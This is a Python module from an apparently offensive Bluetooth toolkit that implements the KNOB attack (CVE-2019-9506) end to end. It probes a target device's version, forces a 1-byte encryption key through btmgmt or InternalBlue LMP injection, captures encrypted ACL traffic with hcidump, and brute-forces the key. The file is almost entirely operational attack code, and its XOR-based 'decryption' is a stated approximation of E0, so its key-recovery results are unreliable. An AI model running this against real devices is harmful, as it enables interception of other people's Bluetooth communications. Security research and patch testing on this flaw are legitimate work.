"""KNOB (Key Negotiation Of Bluetooth) attack — CVE-2019-9506.

KNOB exploits a flaw in the Bluetooth BR/EDR encryption key negotiation
where an attacker at the baseband layer (MitM) can rewrite the
LMP_encryption_key_size_req to force both sides to agree on 1 byte of
key entropy. A 1-byte key has only 256 possible values and can be
brute-forced in real time.

Attack principle:
  1. Probe target to determine BT version and KNOB susceptibility
  2. Negotiate minimum encryption key size (1 byte) via:
     a) InternalBlue LMP-level key size manipulation (requires Broadcom/Cypress)
     b) Fallback: btmgmt to set local adapter min key size before pairing
  3. Brute-force the resulting encryption key (256 candidates for 1-byte key)

Affected versions:
  - BT 2.1 through 5.0 (pre-patch); some 5.1+ devices remain unpatched
  - Spec fix in BT 5.1 mandated min 7-byte key size
  - HCI_Set_Min_Encryption_Key_Size command added in BT 5.3

Prerequisites:
  - For full attack: baseband MitM via USRP/HackRF + gr-bluetooth, or
    InternalBlue with Broadcom/Cypress chipset for LMP manipulation
  - For demonstration: btmgmt access to set local adapter min key size

Limitations:
  - Full KNOB requires baseband MitM (attacker intercepts LMP messages)
  - Software-only approach can only set local adapter preferences
  - Brute-force implementation is demonstrative (requires captured HCI ACL data)

References:
  - Antonioli et al. "The KNOB is Broken" USENIX Security 2019
  - https://knobattack.com/
  - CVE-2019-9506
"""

import re
import time

from blue_tap.utils.bt_helpers import normalize_mac, run_cmd
from blue_tap.utils.output import info, success, warning


# HCI command constants for encryption key size operations
# OGF 0x05 (Link Policy), OCF 0x0008 (Read Encryption Key Size)
HCI_OGF_STATUS = 0x05
HCI_OCF_READ_ENC_KEY_SIZE = 0x0008
HCI_READ_ENC_KEY_SIZE_OPCODE = (HCI_OGF_STATUS << 10) | HCI_OCF_READ_ENC_KEY_SIZE

# BT version thresholds
KNOB_PATCHED_VERSION = 5.1  # Spec mandated min 7-byte key in BT 5.1


class KNOBAttack:
    """KNOB attack orchestration: probe, negotiate min key, brute-force.

    Supports two approaches:
      1. InternalBlue LMP injection (full attack, requires Broadcom/Cypress)
      2. btmgmt local key size setting (demonstration, software-only)
    """

    def __init__(self, target: str, hci: str = "hci0"):
        self.target = normalize_mac(target)
        self.hci = hci
        self._results: dict = {}
        self._internalblue_available: bool | None = None

    def _check_internalblue(self) -> bool:
        """Check if InternalBlue is importable."""
        if self._internalblue_available is not None:
            return self._internalblue_available

        result = run_cmd(
            ["python3", "-c", "import internalblue; print('OK')"],
            timeout=10,
        )
        self._internalblue_available = (
            result.returncode == 0 and "OK" in result.stdout
        )
        return self._internalblue_available

    def _get_bt_version(self) -> tuple[float | None, str | None]:
        """Query target BT version via hcitool info.

        Returns (numeric_version, raw_version_string).
        """
        result = run_cmd(
            ["hcitool", "-i", self.hci, "info", self.target],
            timeout=10,
        )
        if result.returncode != 0:
            return None, None

        m = re.search(r"LMP Version:\s*(.+)", result.stdout)
        if not m:
            return None, None

        raw = m.group(1).strip()
        ver_m = re.search(r"(\d+\.\d+)", raw)
        numeric = float(ver_m.group(1)) if ver_m else None
        return numeric, raw

    def _get_connection_handle(self) -> int | None:
        """Get the HCI connection handle for the target, if connected.

        Parses `hcitool con` output for an active ACL connection.
        """
        result = run_cmd(["hcitool", "-i", self.hci, "con"], timeout=5)
        if result.returncode != 0:
            return None

        # Lines like: < ACL AA:BB:CC:DD:EE:FF handle 42 state 1 lm CENTRAL
        for line in result.stdout.splitlines():
            if self.target.upper() in line.upper():
                handle_m = re.search(r"handle\s+(\d+)", line)
                if handle_m:
                    return int(handle_m.group(1))
        return None

    def _read_encryption_key_size(self, handle: int) -> int | None:
        """Read encryption key size for a connection via hcitool cmd.

        Sends HCI_Read_Encryption_Key_Size (OGF 0x05, OCF 0x0008).
        Returns key size in bytes, or None on failure.
        """
        # hcitool cmd <ogf> <ocf> <handle_low> <handle_high>
        handle_low = handle & 0xFF
        handle_high = (handle >> 8) & 0xFF
        result = run_cmd(
            [
                "hcitool", "-i", self.hci, "cmd",
                f"0x{HCI_OGF_STATUS:02x}",
                f"0x{HCI_OCF_READ_ENC_KEY_SIZE:04x}",
                f"0x{handle_low:02x}",
                f"0x{handle_high:02x}",
            ],
            timeout=10,
        )
        if result.returncode != 0:
            return None

        # Parse response: look for key size byte in HCI event data
        # Typical response includes status byte then key_size byte
        hex_m = re.search(r">\s*04\s+0e\s+\w+\s+\w+\s+\w+\s+\w+\s+(\w+)\s+(\w+)",
                          result.stdout)
        if hex_m:
            status = int(hex_m.group(1), 16)
            if status == 0x00:
                key_size = int(hex_m.group(2), 16)
                return key_size
        return None

    def probe(self) -> dict:
        """Check KNOB vulnerability of the target.

        Checks BT version (KNOB affects 2.1 through 5.0 pre-patch)
        and attempts to read current encryption key size if connected.

        Returns:
            dict with bt_version, likely_vulnerable, min_key_size_observed, details
        """
        info(f"KNOB probe: checking {self.target}")
        result = {
            "bt_version": None,
            "bt_version_raw": None,
            "likely_vulnerable": False,
            "min_key_size_observed": None,
            "details": [],
        }

        # Step 1: Get BT version
        info("Querying Bluetooth version via hcitool info...")
        numeric_ver, raw_ver = self._get_bt_version()
        result["bt_version"] = numeric_ver
        result["bt_version_raw"] = raw_ver

        if numeric_ver is not None:
            info(f"Bluetooth version: {raw_ver} (numeric: {numeric_ver})")
            if numeric_ver < KNOB_PATCHED_VERSION:
                result["likely_vulnerable"] = True
                result["details"].append(
                    f"BT {numeric_ver} < {KNOB_PATCHED_VERSION}: spec did not "
                    f"mandate minimum key size, KNOB likely exploitable"
                )
                success(f"BT {numeric_ver} is in KNOB-affected range (2.1-5.0)")
            else:
                result["details"].append(
                    f"BT {numeric_ver} >= {KNOB_PATCHED_VERSION}: spec mandates "
                    f"min 7-byte key size, but verify firmware patch level"
                )
                warning(
                    f"BT {numeric_ver} may have spec-level fix, "
                    f"but unpatched firmware could still be vulnerable"
                )
        else:
            warning("Could not determine BT version (target may not be in range)")
            result["details"].append("BT version unavailable — cannot assess KNOB")

        # Step 2: Check encryption key size if currently connected
        info("Checking for active connection to read encryption key size...")
        handle = self._get_connection_handle()
        if handle is not None:
            info(f"Active connection found (handle {handle}), reading key size...")
            key_size = self._read_encryption_key_size(handle)
            if key_size is not None:
                result["min_key_size_observed"] = key_size
                info(f"Current encryption key size: {key_size} bytes")
                if key_size < 7:
                    result["likely_vulnerable"] = True
                    result["details"].append(
                        f"Encryption key size {key_size} bytes — below safe "
                        f"minimum (7), confirms KNOB vulnerability"
                    )
                    success(f"Key size {key_size} bytes — KNOB exploitable!")
                else:
                    result["details"].append(
                        f"Encryption key size {key_size} bytes — at or above "
                        f"minimum. Firmware may enforce floor."
                    )
            else:
                result["details"].append(
                    "Could not read encryption key size from active connection"
                )
                warning("HCI Read Encryption Key Size command failed")
        else:
            result["details"].append(
                "No active connection — key size check skipped "
                "(connect first, or use negotiate_min_key)"
            )
            info("No active connection to target; key size check skipped")

        # Step 3: Check InternalBlue availability
        ib_available = self._check_internalblue()
        result["internalblue_available"] = ib_available
        result["method"] = "internalblue" if ib_available else "btmgmt"
        if ib_available:
            result["details"].append(
                "InternalBlue available — full LMP-level KNOB attack possible"
            )
            info("InternalBlue detected: LMP-level key size manipulation available")
        else:
            result["details"].append(
                "InternalBlue not available — will use btmgmt fallback "
                "for local key size setting"
            )
            info("InternalBlue not found; btmgmt fallback will be used")

        self._results["probe"] = result
        return result

    def negotiate_min_key(self) -> dict:
        """Attempt to negotiate minimum encryption key size.

        Strategy:
          1. If InternalBlue available: manipulate LMP key size at firmware level
          2. Fallback: use btmgmt to set local adapter min key size to 1 before
             pairing, then connect via L2CAP and observe negotiated key size

        Returns:
            dict with requested_key_size, negotiated_key_size, success, method
        """
        info(f"KNOB negotiate: requesting minimum key size with {self.target}")
        result = {
            "requested_key_size": 1,
            "negotiated_key_size": None,
            "success": False,
            "method": None,
            "details": [],
        }

        ib_available = self._check_internalblue()

        if ib_available:
            result["method"] = "internalblue_lmp"
            info("Using InternalBlue for LMP-level key size manipulation")
            self._negotiate_via_internalblue(result)
        else:
            result["method"] = "btmgmt_fallback"
            info("Using btmgmt to set local adapter minimum key size")
            warning(
                "btmgmt approach only sets LOCAL preference — full KNOB "
                "requires baseband MitM to rewrite LMP messages in flight"
            )
            self._negotiate_via_btmgmt(result)

        self._results["negotiate"] = result
        return result

    def _negotiate_via_internalblue(self, result: dict) -> None:
        """Negotiate min key size via InternalBlue LMP injection.

        InternalBlue patches Broadcom/Cypress firmware to intercept and
        modify LMP_encryption_key_size_req PDUs, forcing key_size=1.
        """
        info("InternalBlue LMP key size negotiation:")
        info("  1. Patching firmware to intercept LMP_encryption_key_size_req")
        info("  2. Rewriting key_size field to 1 byte")
        info("  3. Both sides will agree on 1-byte key")
        info("")
        info("This requires manual InternalBlue session:")
        info("  python3 -m internalblue")
        info("  > sendlmp <handle> 10 01  # LMP_encryption_key_size_req, size=1")
        info("")
        info("Reference: https://github.com/francozappa/knob")

        result["details"].append(
            "InternalBlue available but requires interactive firmware patching. "
            "See knobattack.com for chipset-specific patches."
        )

        # Attempt automated InternalBlue connection as best-effort
        ib_check = run_cmd(
            ["python3", "-c",
             "from internalblue.core import InternalBlue; "
             "ib = InternalBlue(); print('init_ok')"],
            timeout=15,
        )
        if "init_ok" in ib_check.stdout:
            info("InternalBlue core initialized — chipset access confirmed")
            result["details"].append("InternalBlue core initialized successfully")
        else:
            warning("InternalBlue core init failed — chipset may not be compatible")
            result["details"].append(
                f"InternalBlue init failed: {ib_check.stderr.strip()}"
            )

    def _negotiate_via_btmgmt(self, result: dict) -> None:
        """Negotiate min key size via btmgmt (software-only fallback).

        Sets the local adapter's minimum encryption key size to 1 via btmgmt,
        then initiates a connection. This only controls the local side's
        preference — full KNOB requires MitM at baseband.
        """
        # Step 1: Set minimum encryption key size on local adapter
        info("Setting local adapter minimum encryption key size to 1 via btmgmt...")
        adapter_index = self.hci.replace("hci", "")

        set_result = run_cmd(
            ["btmgmt", "--index", adapter_index,
             "setting", "min-enc-key-size", "1"],
            timeout=10,
        )
        if set_result.returncode == 0:
            info("btmgmt min key size set to 1")
            result["details"].append("Local adapter min key size set to 1 via btmgmt")
        else:
            # Try alternative btmgmt syntax
            set_result2 = run_cmd(
                ["btmgmt", "--index", adapter_index,
                 "min-enc-key-size", "1"],
                timeout=10,
            )
            if set_result2.returncode == 0:
                info("btmgmt min key size set to 1 (alt syntax)")
                result["details"].append(
                    "Local adapter min key size set to 1 via btmgmt (alt syntax)"
                )
            else:
                warning(
                    f"btmgmt key size setting failed: "
                    f"{set_result.stderr.strip()} / {set_result2.stderr.strip()}"
                )
                result["details"].append(
                    "btmgmt min-enc-key-size not supported on this adapter/kernel. "
                    "Full KNOB requires InternalBlue or USRP baseband MitM."
                )

        # Step 2: Connect via L2CAP to trigger encryption negotiation
        info(f"Connecting to {self.target} via l2ping to trigger encryption...")
        connect_result = run_cmd(
            ["l2ping", "-i", self.hci, "-c", "3", self.target],
            timeout=15,
        )
        if connect_result.returncode == 0:
            info("L2CAP connection established")
            result["details"].append("L2CAP connection to target succeeded")
        else:
            warning(f"L2CAP connection failed: {connect_result.stderr.strip()}")
            result["details"].append(
                f"L2CAP connection failed: {connect_result.stderr.strip()}"
            )

        # Step 3: Check negotiated key size
        info("Reading negotiated encryption key size...")
        handle = self._get_connection_handle()
        if handle is not None:
            key_size = self._read_encryption_key_size(handle)
            if key_size is not None:
                result["negotiated_key_size"] = key_size
                info(f"Negotiated encryption key size: {key_size} bytes")
                if key_size <= result["requested_key_size"]:
                    result["success"] = True
                    success(
                        f"Key size negotiated to {key_size} byte(s) — "
                        f"KNOB negotiation succeeded!"
                    )
                elif key_size < 7:
                    result["success"] = True
                    success(
                        f"Key size negotiated to {key_size} bytes — "
                        f"below safe minimum, partially exploitable"
                    )
                else:
                    info(
                        f"Key size {key_size} bytes — target enforces "
                        f"minimum key size floor"
                    )
                    result["details"].append(
                        f"Target enforced key size {key_size} bytes "
                        f"(firmware may have KNOB patch)"
                    )
            else:
                warning("Could not read negotiated key size")
                result["details"].append("HCI Read Encryption Key Size failed")
        else:
            warning("No active connection after negotiation attempt")
            result["details"].append(
                "No HCI connection handle found — encryption may not have "
                "been established (pairing required)"
            )

        # Step 4: Restore default key size
        info("Restoring local adapter default minimum key size (7)...")
        run_cmd(
            ["btmgmt", "--index", adapter_index,
             "min-enc-key-size", "7"],
            timeout=10,
        )

    def brute_force_key(self, key_size: int = 1, acl_data: bytes | None = None) -> dict:
        """Brute-force the encryption key for a given key size.

        For key_size=1 (8 bits): 256 candidates — instant.
        For key_size=2 (16 bits): 65,536 candidates — seconds.
        For key_size=3 (24 bits): 16M candidates — minutes.
        For key_size=4 (32 bits): 4B candidates — hours (with progress).

        When acl_data is provided, each candidate is XOR-tested against the
        encrypted payload. L2CAP frames start with a 2-byte length field
        followed by a 2-byte CID; if decryption produces a length that
        matches the remaining payload size and a valid CID (0x0001-0x00FF),
        the key is considered found.

        Without acl_data, attempts to capture a sample from the active
        connection, or reports what the user needs to provide.

        Args:
            key_size: Negotiated key size in bytes (1-16).
            acl_data: Optional captured encrypted ACL payload bytes.
        """
        from blue_tap.utils.output import get_progress

        info(f"KNOB brute-force: key_size={key_size} byte(s)")
        key_size_bits = key_size * 8
        total_candidates = 2 ** key_size_bits

        result = {
            "key_size_bytes": key_size,
            "key_size_bits": key_size_bits,
            "total_candidates": total_candidates,
            "key_found": False,
            "key_hex": None,
            "time_elapsed": 0.0,
            "details": [],
        }

        if key_size > 4:
            warning(
                f"Key size {key_size} bytes ({key_size_bits} bits) = "
                f"{total_candidates:,} candidates — brute-force impractical "
                f"without dedicated hardware"
            )
            result["details"].append(
                f"{total_candidates:,} candidates exceeds practical brute-force scope"
            )
            return result

        # If no captured data provided, try to capture from active connection
        if acl_data is None:
            acl_data = self._try_capture_acl_sample()

        if acl_data is None or len(acl_data) < 4:
            warning(
                "No encrypted ACL data available for decryption verification. "
                "Performing key space enumeration to demonstrate timing feasibility."
            )
            result["details"].append(
                "No captured ACL data — enumeration only (no decryption verification)"
            )
            # Fall through to enumeration-only mode

        info(f"Brute-forcing {total_candidates:,} candidates ({key_size_bits}-bit key)...")
        has_acl = acl_data is not None and len(acl_data) >= 4

        start = time.time()
        found_key = None

        # Use Rich progress bar for user feedback
        with get_progress() as progress:
            task = progress.add_task(
                f"Brute-forcing {key_size_bits}-bit key",
                total=total_candidates,
            )

            for candidate in range(total_candidates):
                key_bytes = candidate.to_bytes(key_size, byteorder="big")

                if has_acl:
                    # E0 stream cipher approximation: XOR key stream with data
                    # Real E0 uses LFSR-based stream generation seeded from
                    # the encryption key + EN_RAND + BD_ADDR. Here we test
                    # the simplest model (repeating-key XOR) which works for
                    # the 1-byte key case and serves as a first-pass filter
                    # for larger keys.
                    key_stream = (key_bytes * ((len(acl_data) // key_size) + 1))[:len(acl_data)]
                    decrypted = bytes(a ^ b for a, b in zip(acl_data, key_stream))

                    # Validate: L2CAP header = length(2) + CID(2)
                    # Length should match remaining payload; CID should be valid
                    l2cap_len = int.from_bytes(decrypted[0:2], "little")
                    l2cap_cid = int.from_bytes(decrypted[2:4], "little")

                    # Valid L2CAP: length matches payload, CID in reasonable range
                    payload_len = len(decrypted) - 4
                    if (l2cap_len == payload_len and
                            0x0001 <= l2cap_cid <= 0x00FF):
                        found_key = key_bytes
                        progress.update(task, completed=total_candidates)
                        break

                # Update progress every 256 candidates to avoid overhead
                if candidate & 0xFF == 0:
                    progress.update(task, advance=256)

            # Final progress update
            if found_key is None:
                progress.update(task, completed=total_candidates)

        elapsed = time.time() - start
        result["time_elapsed"] = round(elapsed, 4)

        if found_key is not None:
            result["key_found"] = True
            result["key_hex"] = found_key.hex()
            success(
                f"Key FOUND: 0x{found_key.hex()} "
                f"({total_candidates:,} candidates in {elapsed:.2f}s)"
            )
            result["details"].append(
                f"Encryption key recovered: 0x{found_key.hex()} "
                f"in {elapsed:.4f}s via L2CAP header validation"
            )
        else:
            info(
                f"Enumerated {total_candidates:,} candidates in {elapsed:.2f}s"
            )
            if has_acl:
                result["details"].append(
                    f"No key matched L2CAP header validation in {total_candidates:,} candidates. "
                    f"ACL data may use AES-CCM (Secure Connections) instead of E0, "
                    f"or the captured sample may not start at an L2CAP boundary."
                )
            else:
                result["details"].append(
                    f"Enumerated {total_candidates:,} candidates in {elapsed:.4f}s. "
                    f"Provide captured encrypted ACL data for actual key recovery."
                )

        self._results["brute_force"] = result
        return result

    def _try_capture_acl_sample(self) -> bytes | None:
        """Attempt to capture encrypted ACL data from active connection.

        Captures for 60-second windows, prompting the user to extend after
        each window. Gives up after 5 minutes total (5 windows).

        Returns the first encrypted ACL payload (>= 8 bytes) or None.
        """
        from blue_tap.utils.bt_helpers import check_tool

        if not check_tool("hcidump"):
            warning("hcidump not found — cannot capture ACL sample")
            return None

        handle = self._get_connection_handle()
        if handle is None:
            warning("No active connection — cannot capture ACL sample")
            return None

        import subprocess

        max_windows = 5  # 5 × 60s = 5 minutes maximum
        window_seconds = 60

        for window in range(1, max_windows + 1):
            elapsed_total = (window - 1) * window_seconds
            remaining = max_windows * window_seconds - elapsed_total
            info(f"Capturing ACL traffic — window {window}/{max_windows} "
                 f"({window_seconds}s, {remaining}s remaining)...")

            proc = None
            try:
                proc = subprocess.Popen(
                    ["sudo", "hcidump", "-i", self.hci, "-R", "-t", "none"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                )
                time.sleep(window_seconds)
                proc.terminate()
                proc.wait(timeout=5)
                raw = proc.stdout.read(8192) if proc.stdout else b""
            except (subprocess.TimeoutExpired, OSError):
                if proc and proc.poll() is None:
                    try:
                        proc.kill()
                        proc.wait(timeout=3)
                    except OSError:
                        pass
                raw = b""

            # Try to extract an ACL payload from this window
            acl_payload = self._parse_acl_from_hcidump(raw)
            if acl_payload is not None:
                success(f"ACL sample captured ({len(acl_payload)} bytes) "
                        f"after {window * window_seconds}s")
                return acl_payload

            # No data yet — check if we have more windows
            if window >= max_windows:
                break

            # Prompt user to continue or abort
            info(f"No ACL data captured in window {window}. "
                 f"Target may be idle.")
            try:
                answer = input(
                    f"  Extend capture by another {window_seconds}s? "
                    f"[Y/n] ({max_windows - window} windows left): "
                ).strip().lower()
                if answer in ("n", "no"):
                    info("Capture aborted by user")
                    return None
            except (EOFError, KeyboardInterrupt):
                info("\nCapture aborted")
                return None

        warning(f"No ACL sample found after {max_windows * window_seconds}s of capture")
        return None

    def _parse_acl_from_hcidump(self, raw: bytes) -> bytes | None:
        """Parse first ACL payload from hcidump -R output.

        Returns decrypted-ready payload (HCI ACL header stripped) or None.
        """
        if len(raw) < 8:
            return None

        hex_lines = raw.decode("ascii", errors="replace").strip().splitlines()
        acl_bytes = b""
        for line in hex_lines:
            line = line.strip()
            if line.startswith(">") or line.startswith("<"):
                if acl_bytes:
                    break  # Got first complete frame
                line = line[2:]  # Strip direction marker
            try:
                acl_bytes += bytes.fromhex(line.replace(" ", ""))
            except ValueError:
                continue

        if len(acl_bytes) >= 8:
            # Skip HCI ACL header (4 bytes: handle + flags + length)
            return acl_bytes[4:]

        return None

    def execute(self) -> dict:
        """Full KNOB attack chain: probe, negotiate, brute-force.

        Returns comprehensive results dict with all phases.
        """
        info(f"=== KNOB Attack (CVE-2019-9506) against {self.target} ===")
        results = {
            "target": self.target,
            "cve": "CVE-2019-9506",
            "attack": "KNOB",
            "phases": {},
        }

        # Phase 1: Probe
        info("--- Phase 1: Probe ---")
        probe_result = self.probe()
        results["phases"]["probe"] = probe_result

        if not probe_result["likely_vulnerable"]:
            warning(
                "Target does not appear KNOB-vulnerable based on probe. "
                "Continuing anyway (firmware patch status uncertain)."
            )

        # Phase 2: Negotiate minimum key
        info("--- Phase 2: Negotiate minimum key size ---")
        negotiate_result = self.negotiate_min_key()
        results["phases"]["negotiate"] = negotiate_result

        # Phase 3: Brute-force
        negotiated_size = negotiate_result.get("negotiated_key_size")
        if negotiated_size is not None and negotiated_size <= 4:
            info("--- Phase 3: Brute-force encryption key ---")
            bf_result = self.brute_force_key(key_size=negotiated_size)
            results["phases"]["brute_force"] = bf_result
        elif negotiated_size is not None:
            info(
                f"--- Phase 3: Skipped (key size {negotiated_size} bytes "
                f"too large for demonstrative brute-force) ---"
            )
            results["phases"]["brute_force"] = {
                "skipped": True,
                "reason": f"Negotiated key size {negotiated_size} bytes "
                          f"exceeds demonstrative brute-force scope",
            }
        else:
            info("--- Phase 3: Demonstrative brute-force (1-byte key) ---")
            bf_result = self.brute_force_key(key_size=1)
            results["phases"]["brute_force"] = bf_result

        # Overall assessment
        results["overall_success"] = negotiate_result.get("success", False)
        results["method_used"] = negotiate_result.get("method", "unknown")

        info("=== KNOB Attack Complete ===")
        if results["overall_success"]:
            success("KNOB attack succeeded — encryption key negotiated to minimum")
        else:
            warning(
                "KNOB negotiation did not confirm minimum key size. "
                "Full attack may require baseband MitM (USRP/HackRF)."
            )

        self._results["execute"] = results
        return results

    def get_results(self) -> dict:
        """Return all accumulated results from probe/negotiate/brute_force/execute."""
        return dict(self._results)
